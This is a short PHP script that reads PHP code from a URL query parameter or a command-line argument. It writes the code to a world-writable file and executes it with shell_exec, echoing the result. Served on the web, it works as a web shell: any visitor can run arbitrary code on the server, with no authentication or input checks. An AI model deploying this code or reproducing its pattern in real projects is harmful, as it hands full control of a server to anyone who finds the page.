<?php

	require_once 'file_lib.php';

	if(isset($_GET['script'])){
		$php_content = $_GET['script'];
	}else{
		$php_content = $argv[1];
	}

	chmod('script.php', 0777);

	write_file('script.php', $php_content);

	echo shell_exec('php script.php');

?>